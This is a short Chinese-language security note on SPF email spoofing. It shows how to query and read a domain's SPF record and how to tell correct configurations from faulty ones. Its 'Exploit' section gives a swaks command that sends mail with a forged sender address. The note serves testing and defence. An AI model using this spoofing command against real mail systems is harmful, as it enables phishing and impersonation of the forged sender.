## 1. PoC

检测 spf 记录

```
┌──(root@debian)-[~]
└─# nslookup -type=TXT example.com
Server:         8.8.8.8
Address:        8.8.8.8#53

Non-authoritative answer:
example.com     text = "_k2n1y4vw3qtb4skdx9e7dxt97qrmmq9"
example.com     text = "v=spf1 -all"

Authoritative answers can be found from:
```

```
v=spf1 -all: 无法伪造
v=spf1 ~all, v=spf1 ?all: 可能伪造
无 v=spf1 或 v=spf1 +all: 极易伪造
```

使用 [SPF Query Tool ](https://www.kitterman.com/spf/validate.html) 解析 SPF 记录是否配置正确, 若配置错误则可尝试绕过 SPF 保护

![使用 SPF Query Tool 解析 SPF 记录是否配置正确, 若配置错误则可尝试绕过 SPF 保护](./../../../images/SPF%20%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/%E4%BD%BF%E7%94%A8%20SPF%20Query%20Tool%20%E8%A7%A3%E6%9E%90%20SPF%20%E8%AE%B0%E5%BD%95%E6%98%AF%E5%90%A6%E9%85%8D%E7%BD%AE%E6%AD%A3%E7%A1%AE,%20%E8%8B%A5%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%88%99%E5%8F%AF%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87%20SPF%20%E4%BF%9D%E6%8A%A4.png)

配置正确

```
v=spf1 include:spf1.example.com include:spf2.example.com include:spf3.example.com include:spf4.example.com -all
```

![](./../../../images/SPF_%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/%E9%85%8D%E7%BD%AE%E6%AD%A3%E7%A1%AE.png)

配置错误

```
v=spf1 include:spf1.example.com spf2.example.com spf3.example.com spf4.example.com -all
```

![](./../../../images/SPF_%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF.png)

## 2. Exploit

伪造 example 向 test 发送邮件

```
┌──(root-kali)-[~]          
└─# swaks --body "Hello, World!" --header "Subject:example" -t admin@test.com -f admin@example.com
```

```
--body   邮件内容
--header 邮件标题
-t       目标邮箱
-f       伪造邮箱
```

